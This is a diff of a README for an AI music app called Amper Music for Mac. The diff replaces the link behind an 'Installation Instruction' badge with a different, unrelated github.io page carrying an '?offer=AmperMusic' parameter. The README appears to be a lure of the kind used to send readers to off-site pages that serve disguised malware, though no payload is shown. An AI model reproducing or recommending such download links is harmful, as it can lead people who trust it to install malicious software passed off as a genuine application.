@@ -5,7 +5,7 @@ Amper Music for Mac is an innovative desktop application that harnesses AI to ge
 
 Explore the guide below to learn how Amper Music can elevate your music production and creative projects.  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://aildelolady750.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=AmperMusic)
 
 ---
 
